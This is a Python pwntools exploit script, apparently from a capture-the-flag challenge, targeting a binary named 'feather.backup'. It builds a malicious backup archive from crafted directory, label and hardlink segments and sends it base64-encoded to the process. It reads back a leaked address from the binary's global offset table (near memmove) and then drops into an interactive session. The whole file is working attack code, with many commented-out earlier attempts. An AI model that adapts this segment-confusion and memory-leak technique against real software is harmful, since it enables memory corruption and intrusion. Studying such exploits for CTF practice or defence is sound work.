#!/usr/bin/env python3

from pwn import *
import base64
from enum import Enum

class SegmentType(Enum):
    Directory = 0
    File = 1
    File_Clone = 2
    Symlink = 3
    Hardlink = 4
    Label = 5

def gen_directory(namelength, numentries, name, entries):
    nl = p32(namelength)
    ne = p32(numentries)
    directory = nl + ne + name + entries
    return directory

def gen_hardlink(namelength, target, name):
    nl = p32(namelength)
    t = p32(target)
    hardlink = nl + t + name
    return hardlink

def gen_header(numsections):
    magic = p64(0x52454854414546)
    n = p32(numsections)
    header = magic + n
    return header

def gen_fileclone(namelength, target_inode, name):
    nl = p32(namelength)
    ti = p32(target_inode)
    n = name
    fileclone = nl + ti + n
    return fileclone

def gen_segment(segtype, segid, offset, length):
    t = p32(segtype)
    i = p32(segid)
    o = p32(offset)
    l = p32(length)
    segment = t + i + o + l
    return segment

def gen_symlink(namelength, targetlength, name, target):
    nl = p32(namelength)
    tl = p32(targetlength)
    n = name
    t = target
    symlink = nl + tl + n + t
    return symlink

libc = ELF('./libc-2.31.so', checksec=False)
env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc-2.31.so")}

_FILE = './feather.backup'

if args.GDB:
    io = gdb.debug(_FILE, gdbscript="\nc\n") #, env=env)
else:
    io = process(_FILE) #, env=env)

binary = context.binary = ELF(_FILE, checksec=False)

header = gen_header(4)

#rootdirectory = gen_directory(0, 2, b'', p32(1) + p32(2))
rootdirectory = gen_directory(0, 2, b'', p32(2) + p32(3))
rootfilesegment = gen_segment(SegmentType.Directory.value, 0, 0, len(rootdirectory))

#testdirectory = gen_directory(len(b'test'), 100, b'test', b'')
testdirectory = gen_directory(len(b'test'), 0, b'test', b'')
#offset = len(rootdirectory)
#testdirectorysegment = gen_segment(SegmentType.Directory.value, 1, 0, 0x4141414142424242)
memmove = p32(0x41a0f0)
leaksegment = p32(SegmentType.File.value) + p32(1) + memmove + p32(0)

writesegment = p32(SegmentType.File.value) + p32(1) + memmove + p32(0)

labelsegment = b''
labelsegment += gen_segment(SegmentType.Label.value, 1, len(rootdirectory), len(testdirectory) + len(leaksegment))


leakhardlink = gen_hardlink(len(b'test'), 1, b'test')
offset = len(rootdirectory) + len(testdirectory)
leakhardlinksegment = gen_segment(SegmentType.Hardlink.value, 2, len(rootdirectory), len(leakhardlink))

writehardlink = gen_hardlink(len(b'test2'), 1, b'test2')
offset = len(rootdirectory) + len(leaksegment) + len(writesegment) + len(testdirectory) + len(leakhardlink)
writehardlinksegment = gen_segment(SegmentType.Hardlink.value, 3, offset, len(writehardlink))


#symlink = gen_symlink(len(b'testlink'), len(b'/test'), b'testlink', b'/test')
#offset = len(rootdirectory) + len(testdirectory)
#symlinksegment = gen_segment(SegmentType.Symlink.value, 1, offset, len(symlink))

#fileclone = gen_fileclone(len(b'test'), 1, b'test')
#offset = len(rootdirectory) + len(testdirectory)
#fileclonesegment = gen_segment(SegmentType.File_Clone.value, 2, offset, len(fileclone))

#symlink = gen_symlink(len(b'testlink'), len(b'/test'), b'testlink', b'/test')
#offset = len(rootdirectory) + len(testdirectory)
#symlinksegment = gen_segment(SegmentType.Symlink.value, 2, offset, len(symlink))

#offset = len(rootdirectory) + len(testdirectory)
#labelsegment = gen_segment(SegmentType.Label.value, 2, offset, 1024)



#payload = header + rootfilesegment + testdirectorysegment + symlinksegment + rootdirectory + testdirectory + symlink
#payload = header + rootfilesegment + labelsegment + testdirectorysegment + rootdirectory + testdirectory
payload = header + rootfilesegment + labelsegment + leakhardlinksegment + writehardlinksegment + rootdirectory + leaksegment + writesegment + testdirectory + leakhardlink + writehardlink
#payload = header + rootfilesegment + rootdirectory

b64payload = base64.b64encode(payload)
print(b64payload)

io.sendline(b64payload)
io.sendline(b'')

io.recvuntil(b':/')
result = io.recvuntil(":")[3:-1]
print("TEST")
print(result)
memvegot = u64(result.ljust(8, b'\x00'))
log.info(f"Leak: {hex(memvegot)}")

io.interactive()
